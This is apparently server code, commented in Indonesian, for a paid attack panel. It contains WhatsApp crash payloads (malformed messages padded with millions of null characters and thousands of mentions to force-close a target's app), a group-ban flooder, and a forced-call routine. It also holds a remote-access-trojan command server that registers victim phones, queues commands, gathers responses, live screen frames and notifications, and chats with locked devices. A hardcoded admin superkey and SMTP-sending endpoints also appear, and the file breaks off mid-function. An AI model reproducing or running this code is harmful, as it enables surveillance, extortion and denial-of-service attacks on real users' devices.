async function permenCall(sock, toJid, isVideo = true) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

  const callLayout = []
  const offerContent = [
    //{ tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
    { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
    isVideo ? {
      tag: 'video',
      attrs: {
        enc: 'vp8',
        dec: 'vp8',
        orientation: '0',
        screen_width: '1920',
        screen_height: '1080',
        device_orientation: '0'
      }
    } : null,
    { tag: 'net', attrs: { medium: '3' } },
    { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([0x00, 0x00, 0x00, 0x00]) },
    { tag: 'encopt', attrs: { keygen: '2' } }
  ].filter(Boolean);

  callLayout.push({ tag: 'title', attrs: { ver: '1' }, content: 'vanzzmd' })
  const encKey = crypto.randomBytes(32);
  const devices = (await sock.getUSyncDevices([toJid], true, false))
    .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

  await sock.assertSessions(devices, true);

  const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
    call: { callKey: new Uint8Array(encKey) }
  }, { count: '2' });

  offerContent.push({ tag: 'destination', attrs: {}, content: destinations });

  if (shouldIncludeDeviceIdentity) {
    const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
    offerContent.push({
      tag: 'device-identity',
      attrs: {},
      content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
    });
  }

  const stanza = {
    tag: 'call',
    attrs: {
      id: sock.generateMessageTag(),
      to: toJid
    },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': callId,
        'call-creator': sock.user.id
      },
      content: offerContent
    }]
  };

  await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
  return { id: callId, to: toJid };
}


async function iosLx(Yuukey, target) {
  for ( let z = 0; z < 2; z++ ) {
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/forno",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: null, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

async function gsGlx(Yuukey, target, zid = true) {
  for(let z = 0; z < 10; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "7eppeli - Expos3d",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}
// ── RAT: Ambil pairId milik user (untuk ditampilkan di Device Dashboard) ──────
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  // Generate pairId kalau belum ada dan simpan
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  console.log('[PAIRID] Serving pairId for: ' + db[idx].username + ' → ' + db[idx].pairId);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

// ── RAT: permission member bisa lihat device owner ────────────────────────────
// POST /rat/grant-member { ownerKey, memberUsername, deviceIds:[] / allDevices:bool }
app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  // Simpan permission ke member: bisa lihat device mana saja milik owner
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

// ── RAT: revoke akses member ───────────────────────────────────────────────────
app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

// ── RAT: member cek permission & ambil device yang boleh dilihat ──────────────
app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  // Owner & Dev: lihat semua device milik sendiri
  if (user.role === "owner" || user.role === "dev") {
    const owned = targets.filter(t => t.owner === user.username);
    return res.json({ valid: true, pairId: user.pairId, role: user.role, devices: owned });
  }

  // Member/reseller: cek device_perms.json (sistem utama)
  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];

  let allowedDevices = [];

  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      // Boleh lihat semua device dari semua owner
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
      // Boleh lihat device tertentu saja
      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  } else {
    // Fallback: cek sistem lama ratPerms di database
    for (const owner of db.filter(u => u.role === "owner" || u.role === "dev")) {
      const perm = owner.ratPerms?.[user.username];
      if (!perm || !perm.approved) continue;
      const ownerDevices = targets.filter(t => t.owner === owner.username);
      if (perm.allDevices) {
        allowedDevices = allowedDevices.concat(ownerDevices);
      } else {
        allowedDevices = allowedDevices.concat(
          ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
        );
      }
    }
  }

  res.json({ valid: true, pairId: null, role: user.role, devices: allowedDevices });
});


// ══════════════════════════════════════════════════════════════════════════════
// RAT CORE ENDPOINTS (device target berkomunikasi via port ini)
// ══════════════════════════════════════════════════════════════════════════════

app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status   = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else          t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  
  let db = loadDatabase();
  
  // AUTO-FIX: generate pairId untuk semua user yang belum punya
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);
  
  // Cari owner berdasarkan pairId (case-insensitive)
  const ownerIdx = db.findIndex(u => 
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );
  
  console.log('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  if (ownerIdx >= 0) {
    console.log('[PAIR-DEBUG] Owner found: ' + db[ownerIdx].username + ' | Their pairId: ' + db[ownerIdx].pairId);
  } else {
    console.log('[PAIR-DEBUG] All pairIds in DB: ' + db.map(u => u.username + ':' + u.pairId).join(', '));
  }
  
  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard AX RRG' });
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { id: deviceId, model: model || 'Unknown', battery: battery || '?', owner: owner.username, status: 'Online', lastSeen: new Date() };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else          t.push(dev);
  saveRat(RAT_TARGETS, t);
  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

app.get('/api/list-targets', (req, res) => {
  const { owner } = req.query;
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  console.log('[CMD] ' + id + ': ' + command);
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat('./rat_notifs.json');
  res.json(n.filter(x => x.targetId === req.params.id));
});

// Init RAT files
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  const p = './' + f + '.json';
  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
});


// ════════════════════════════════════════════════════════════════════════════
// DELAY FC — Force Close WhatsApp via malformed interactive message
// Teknik: corrupt nativeFlowMessage dengan payload yang tidak bisa di-parse WA
async function delayAxRRG(sock, target) {
  const jid = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
  try {
    // Method 1: Corrupt interactive native flow — bikin WA parser hang
    const badFlow = generateWAMessageFromContent(jid, {
      interactiveMessage: {
        header: {
          title: String.fromCharCode(0).repeat(500000),
          hasMediaAttachment: false
        },
        body: {
          text: String.fromCharCode(0).repeat(1000000)
        },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: Array.from({ length: 50000 }, (_, i) => ({
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: String.fromCharCode(0).repeat(50000) + i,
              url: "https://wa.me/" + String.fromCharCode(0).repeat(10000),
              merchant_url: "https://wa.me/" + String.fromCharCode(0).repeat(10000)
            })
          })),
          messageParamsJson: JSON.stringify({
            flow_token: String.fromCharCode(0).repeat(500000),
            flow_id: String.fromCharCode(0).repeat(200000),
            data: Object.fromEntries(
              Array.from({ length: 10000 }, (_, i) => [
                String.fromCharCode(0).repeat(1000) + i,
                String.fromCharCode(0).repeat(5000)
              ])
            )
          })
        },
        contextInfo: {
          forwardingScore: 999999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 5000 }, () =>
            Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            conversation: String.fromCharCode(0).repeat(500000)
          }
        }
      }
    }, {});
    await sock.relayMessage(jid, badFlow.message, { messageId: badFlow.key.id });

    // Method 2: requestPayment dengan data corrupt
    await sock.relayMessage(jid, {
      requestPaymentMessage: {
        currencyCodeIso4217: String.fromCharCode(0).repeat(100000),
        amount1000: 999999999999,
        requestFrom: jid,
        noteMessage: {
          extendedTextMessage: {
            text: String.fromCharCode(0).repeat(2000000),
            contextInfo: {
              mentionedJid: Array.from({ length: 8000 }, () =>
                Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
              ),
              forwardingScore: 999999999
            }
          }
        },
        expiryTimestamp: 99999999999999,
        amount: { offset: 0, value: 999999999, currencyCode: "IDR" }
      }
    }, {});

    console.log("[DELAY FC] Sent to " + jid);
  } catch(e) {
    console.warn("[DELAY FC] Error:", e.message);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// BAN GROUP V1 — UPGRADE (LOOP + BURST + PARALLEL)
// ════════════════════════════════════════════════════════════════════════════

async function groupBan1(sock, target, options = {}) {
  const {
    loopCount = 100,
    burstSize = 10,
    delay = 500,
    useRandom = true
  } = options;

  if (!target.endsWith("@g.us")) {
    throw new Error("@g.us server required");
  }

  // ─── FAKE NUMBERS HARDCODED ─────────────────────────────────
  const baseFakeNumbers = [
    "6280000000000@s.whatsapp.net",
    "14155552671@s.whatsapp.net",
    "447400000000@s.whatsapp.net",
    "61400000000@s.whatsapp.net",
    "6281234567890@s.whatsapp.net",
    "6287873499996@s.whatsapp.net",
    "6285655555555@s.whatsapp.net",
    "6289876543210@s.whatsapp.net",
    "6281111111111@s.whatsapp.net",
    "6282222222222@s.whatsapp.net",
    "6283333333333@s.whatsapp.net",
    "6284444444444@s.whatsapp.net",
    "6285555555555@s.whatsapp.net",
    "6286666666666@s.whatsapp.net",
    "6287777777777@s.whatsapp.net",
    "6288888888888@s.whatsapp.net",
    "6289999999999@s.whatsapp.net"
  ];

  // ─── AUTO GENERATE FAKE NUMBERS ─────────────────────────────
  function generateFakeNumbers(count = 50) {
    const numbers = [];
    const prefixes = [
      "628", "601", "614", "1415", "447", "4474", "819", "881", "491", "336"
    ];
    
    for (let i = 0; i < count; i++) {
      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
      const randomPart = Math.floor(Math.random() * 999999999).toString();
      const number = prefix + randomPart.slice(0, 12 - prefix.length);
      numbers.push(number + "@s.whatsapp.net");
    }
    return numbers;
  }

  // ─── GABUNGIN FAKE NUMBERS ──────────────────────────────────
  const fakeNumbers = [
    ...baseFakeNumbers,
    ...generateFakeNumbers(50)
  ];

  const actions = ["add", "remove", "promote", "demote"];

  let success = 0;
  let failed = 0;
  let senderDisconnected = false;

  console.log("[BAN V1] 🚫 Starting for: " + target);
  console.log("[BAN V1] Loop: " + loopCount + " | Burst: " + burstSize + " | Delay: " + delay + "ms");

  const startTime = Date.now();
  const totalBurst = Math.ceil(loopCount / burstSize);

  for (let burst = 0; burst < totalBurst; burst++) {
    try {
      const requests = [];
      
      for (let j = 0; j < burstSize; j++) {
        const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
        const action = actions[Math.floor(Math.random() * actions.length)];
        
        requests.push(
          sock.groupParticipantsUpdate(target, [fake], action)
            .then(() => { success++; })
            .catch((e) => {
              failed++;
              const errMsg = (e.message || "").toLowerCase();
              
              if (
                errMsg.includes("connection closed") ||
                errMsg.includes("connection terminated") ||
                errMsg.includes("not connected") ||
                errMsg.includes("socket closed") ||
                errMsg.includes("logged out") ||
                errMsg.includes("401") ||
                errMsg.includes("403")
              ) {
                senderDisconnected = true;
              }
            })
        );
      }

      await Promise.all(requests);

      if ((burst + 1) % 2 === 0) {
        console.log("[BAN V1] Burst: " + (burst + 1) + "/" + totalBurst + " | Success: " + success + " | Failed: " + failed);
      }

      if (senderDisconnected) {
        console.log("[BAN V1] ⚠️ Sender DISCONNECTED at burst " + (burst + 1));
        break;
      }

      await sleep(delay);
      
    } catch (e) {
      failed++;
    }
  }

  const duration = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log("[BAN V1] ✅ DONE | Success: " + success + " | Failed: " + failed + " | Duration: " + duration + "s");

  return {
    success: success > 0,
    totalSent: success,
    totalFailed: failed,
    duration: duration + "s",
    senderDisconnected: senderDisconnected,
    target: target
  };
}


// ── DEBUG: Lihat pairId semua user (akses dengan superkey) ───────────────────
app.get('/admin/listpairids', (req, res) => {
  const { superkey } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
  res.json(list);
});

// ── FORCE GENERATE pairId untuk 1 user (untuk troubleshoot) ──────────────────
app.get('/admin/genpairid', (req, res) => {
  const { superkey, username } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ error: 'User not found' });
  db[idx].pairId = genPairId();
  saveDatabase(db);
  console.log(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
  res.json({ username, pairId: db[idx].pairId });
});



// ════════════════════════════════════════════════════════════
// LOCK LIVE CHAT — komunikasi 2 arah owner ↔ target saat device di-lock
// ════════════════════════════════════════════════════════════════════════════
const lockChats = {}; // in-memory { deviceId: [{from, text, time}] }

// Owner kirim pesan ke target (via panel AX RRG)
app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'owner', text, time: new Date().toISOString().substring(11,16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  console.log(`[CHAT] ${from||'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

// Target ambil semua pesan (polling setiap 2 detik dari APK)
app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

// Panel ambil semua pesan (polling dari AX RRG)
app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

// Clear chat saat unlock
app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});


// ══════════════════════════════════════════════════════════════
// EMAIL ENDPOINTS — Full Suite
// ══════════════════════════════════════════════════════════════

// ── 1. Buat email temp baru (dengan quota check) ───────────────
app.post('/api/email/create-temp', express.json(), async (req, res) => {
  const { key, username, customName } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const quota = checkEmailQuota(keyInfo.username);
  if (!quota.ok) {
    return res.status(403).json({
      valid: false,
      message: quota.reason,
      currentPlan: getEmailPlan(keyInfo.username).plan,
      upgradeRequired: true
    });
  }

  if (!checkEmailRate(keyInfo.username)) {
    return res.status(429).json({ valid: false, message: 'Rate limit: max 10 email/menit' });
  }

  try {
    const domains = await mailtm_getDomains();
    if (!domains.length) return res.json({ valid: false, message: 'No domain available' });

    const domain = domains[Math.floor(Math.random() * domains.length)].domain;
    const local = (customName || username || keyInfo.username || 'user')
      .toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 15) + Math.floor(Math.random() * 99999);
    const address = `${local}@${domain}`;
    const password = crypto.randomBytes(10).toString('hex');

    const acc = await mailtm_createAccount(address, password);
    const token = await mailtm_getToken(address, password);

    const db = loadEmailDB();
    if (!db[keyInfo.username]) db[keyInfo.username] = [];
    db[keyInfo.username].push({
      address, password, accountId: acc.id, token,
      provider: 'mail.tm',
      createdAt: new Date().toISOString(),
      expireAt: new Date(Date.now() + quota.plan.retentionDays * 86400000).toISOString()
    });
    saveEmailDB(db);

    console.log(`[📧 CREATE] ${keyInfo.username} [${quota.plan.plan}] → ${address}`);
    return res.json({
      valid: true, address, password,
      plan: quota.plan.plan,
      quotaUsed: quota.used + 1,
      quotaMax: quota.plan.maxEmails,
      expireAt: db[keyInfo.username].slice(-1)[0].expireAt
    });
  } catch (e) {
    console.error('[EMAIL] create-temp error:', e.message);
    return res.json({ valid: false, message: e.message });
  }
});

// ── 2. List semua email user ───────────────────────────────────
app.get('/api/email/list', (req, res) => {
  const key = req.query.key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const db = loadEmailDB();
  const list = (db[keyInfo.username] || []).map(e => ({
    address: e.address,
    provider: e.provider,
    createdAt: e.createdAt,
    expireAt: e.expireAt
  }));
  return res.json({ valid: true, emails: list });
});

// ── 3. Baca inbox ──────────────────────────────────────────────
app.get('/api/email/inbox', async (req, res) => {
  const { key, address } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const db = loadEmailDB();
  const acc = (db[keyInfo.username] || []).find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Email not found' });

  try {
    const token = await ensureMailToken(acc);
    saveEmailDB(db);
    const messages = await mailtm_listMessages(token);
    return res.json({
      valid: true,
      address: acc.address,
      count: messages.length,
      unseen: messages.filter(m => !m.seen).length,
      messages: messages.map(m => ({
        id: m.id,
        from: m.from?.address || '-',
        fromName: m.from?.name || '',
        subject: m.subject || '(no subject)',
        intro: m.intro || '',
        seen: !!m.seen,
        hasAttachments: !!m.hasAttachments,
        createdAt: m.createdAt
      }))
    });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// ── 4. Baca isi pesan ──────────────────────────────────────────
app.get('/api/email/read', async (req, res) => {
  const { key, address, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const db = loadEmailDB();
  const acc = (db[keyInfo.username] || []).find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Email not found' });

  try {
    const token = await ensureMailToken(acc);
    saveEmailDB(db);
    const msg = await mailtm_readMessage(token, id);
    return res.json({
      valid: true,
      id: msg.id,
      from: msg.from?.address || '-',
      fromName: msg.from?.name || '',
      to: (msg.to || []).map(t => t.address).join(', '),
      cc: (msg.cc || []).map(t => t.address).join(', '),
      subject: msg.subject || '(no subject)',
      text: msg.text || '',
      html: Array.isArray(msg.html) ? msg.html.join('') : (msg.html || ''),
      attachments: (msg.attachments || []).map(a => ({
        filename: a.filename, size: a.size,
        contentType: a.contentType, downloadUrl: a.downloadUrl
      })),
      createdAt: msg.createdAt
    });
  } catch (e) {
    return res.json({ valid: false, message: e.message });
  }
});

// ── 5. Hapus email ─────────────────────────────────────────────
app.post('/api/email/delete', express.json(), (req, res) => {
  const { key, address, hard } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const db = loadEmailDB();
  const list = db[keyInfo.username] || [];
  const acc = list.find(e => e.address === address);
  if (!acc) return res.json({ valid: false, message: 'Not found' });

  if (hard && acc.accountId) {
    mailtm_deleteAccount(acc.token, acc.accountId).catch(() => {});
  }
  db[keyInfo.username] = list.filter(e => e.address !== address);
  saveEmailDB(db);
  return res.json({ valid: true, message: 'Deleted' });
});

// ── 6. Kirim email via SMTP ────────────────────────────────────
app.post('/api/email/send', express.json(), async (req, res) => {
  const { key, smtp, to, subject, body, html } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });

  const plan = getEmailPlan(keyInfo.username);
  if (!plan.smtpSend) {
    return res.status(403).json({ valid: false, message: 'Fitur SMTP butuh paket Pro ke atas', upgradeRequired: true });
  }

  if (!smtp?.host || !smtp?.user || !smtp?.pass || !to || !subject) {
    return res.json({ valid: false, message: 'Missing fields (host, user, pass, to, subject)' });
  }

  try {
    const transporter = nodemailer.createTransport({
      host: smtp.host,
      port: smtp.port || 587,
      secure: smtp.secure === true || smtp.port === 465,
      auth: { user: smtp.user, pass: smtp.pass }
    });
    const info = await transporter.sendMail({
      from: smtp.from || smtp.user,
      to, subject,
      text: body || '',
      html: html || undefined
    });
    console.log(`[📤 SEND] ${keyInfo.username} → ${to}`);
    return res.json({ valid: true, messageId: info.messageId, accepted: info.accepted });
  } catch (e) {
    console.error('[EMAIL] send error:', e.message);
    return res.json({ valid: false, message: e.message });
  }
});

// ── 7. Statistik email user ────────────────────────────────────
app.get('/api/email/stats', async (req, res) => {
  const key = req.query.key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadEmailDB();
  const list = db[keyInfo.username] || [];
  let totalMsgs = 0, totalUnseen = 0;
  for (const acc of list) {
    try {
      const token = await ensureMailToken(acc);
      const msgs = await mailtm_listMessages(token);
      totalMsgs += msgs.length;
      totalUnseen += msgs.filter(m => !m.seen).length;
    } catch (_) {}
  }
  saveEmailDB(db);
  return res.json({
    valid: true,
    accounts: list.length,
    totalMessages: totalMsgs,
    totalUnseen,
    plan: getEmailPlan(keyInfo.username).plan
  });
});

// ── 8. Daftar paket ────────────────────────────────────────────
app.get('/api/email/plans', (req, res) => {
  const plans = Object.entries(EMAIL_PLANS).map(([code, p]) => ({
    code, name: p.name, price: p.price,
    priceFormatted: 'Rp ' + p.price.toLocaleString('id-ID'),
    maxEmails: p.maxEmails === -1 ? 'Unlimited' : p.maxEmails,
    maxMessages: p.maxMessages === -1 ? 'Unlimited' : p.maxMessages,
    retentionDays: p.retentionDays,
    features: {
      smtpSend: p.smtpSend, customDomain: p.customDomain,
      apiAccess: p.apiAccess, reseller: p.reseller
    }
  }));
  return res.json({ valid: true, plans });
});

// ── 9. Plan aktif user ─────────────────────────────────────────
app.get('/api/email/my-plan', (req, res) => {
  const key = req.query.key;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const plan = getEmailPlan(keyInfo.username);
  const db = loadEmailDB();
  const userEmails = db[keyInfo.username] || [];

  return res.json({
    valid: true,
    plan: plan.plan,
    planName: plan.name,
    expiredAt: plan.expiredAt,
    quota: {
      emailUsed: userEmails.length,
      emailMax: plan.maxEmails === -1 ? 'Unlimited' : plan.maxEmails,
      messageMax: plan.maxMessages === -1 ? 'Unlimited' : plan.maxMessages,
      retentionDays: plan.retentionDays
    },
    features: {
      smtpSend: plan.smtpSend, customDomain: plan.customDomain,
      apiAccess: plan.apiAccess, reseller: plan.reseller
    }
  });
});

// ── 10. Beli paket (auto invoice XentraPay) ────────────────────
app.post('/api/email/buy-plan', express.json(), async (req, res) => {
  const { key, planCode } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const plan = EMAIL_PLANS[planCode];
  if (!plan || planCode === 'free') {
    return res.status(400).json({ valid: false, message: 'Paket tidak valid' });
  }

  try {
    const invoiceRes = await axios.get(
      `https://app.xentrapay.xyz/api/invoice?apikey=${XENTRA_API_KEY}&amount=${plan.price}`
    );

    const pendingFile = './pending_email_plans.json';
    let pending = [];
    if (fs.existsSync(pendingFile)) pending = JSON.parse(fs.readFileSync(pendingFile, 'utf8'));

    pending.push({
      invoice_id: invoiceRes.data.invoice_id,
      username: keyInfo.username,
      plan: planCode,
      amount: plan.price,
      created_at: new Date().toISOString()
    });
    fs.writeFileSync(pendingFile, JSON.stringify(pending, null, 2));

    return res.json({
      valid: true,
      invoice_id: invoiceRes.data.invoice_id,
      qris_image: invoiceRes.data.qris_image,
      payment_link: invoiceRes.data.payment_link,
      amount: invoiceRes.data.amount,
      total: invoiceRes.data.total,
      expired_at: invoiceRes.data.expired_at,
      plan: plan.name,
      message: `Bayar Rp ${plan.price.toLocaleString('id-ID')} untuk paket ${plan.name}`
    });
  } catch (e) {
